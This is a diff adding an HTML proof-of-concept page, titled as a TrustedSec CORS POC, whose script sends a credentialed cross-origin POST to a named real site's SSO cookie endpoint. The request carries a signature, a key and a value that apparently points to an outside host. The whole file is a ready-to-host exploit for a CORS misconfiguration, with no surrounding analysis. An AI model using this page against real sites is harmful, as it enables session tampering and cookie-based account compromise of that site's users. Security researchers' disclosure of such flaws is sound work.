@@ -1,0 +1,23 @@
+<html>
+	<head>
+		<title>TrustedSec CORS POC</title>
+	</head>
+	<body>
+		<h1>TrustedSec CORS POC</h>
+		<script>
+			var xhr = new XMLHttpRequest();
+			//The target site with the bad CORS configuration
+			var url = 'https://my.oppo.com/setssocookie.php';
+			xhr.open('POST', url, true);//POST
+			xhr.setRequestHeader("Content-type","application/x-www-form-urlencoded; charset=UTF-8");
+			/*  This tells the browser to send the request with cookies;
+			    requires “Access-Control-Allow-Credentials = true” in
+			    response headers for this.responseText to be readable.  */
+			xhr.withCredentials = true;
+			//xhr.send();//
+			xhr.send('sign=ff16c375ca7b5fb7dad9497284b25493&value=b.cp0.win/?&key=OCLOUD_BEBG&');
+
+
+		</script>
+	</body>
+</html>
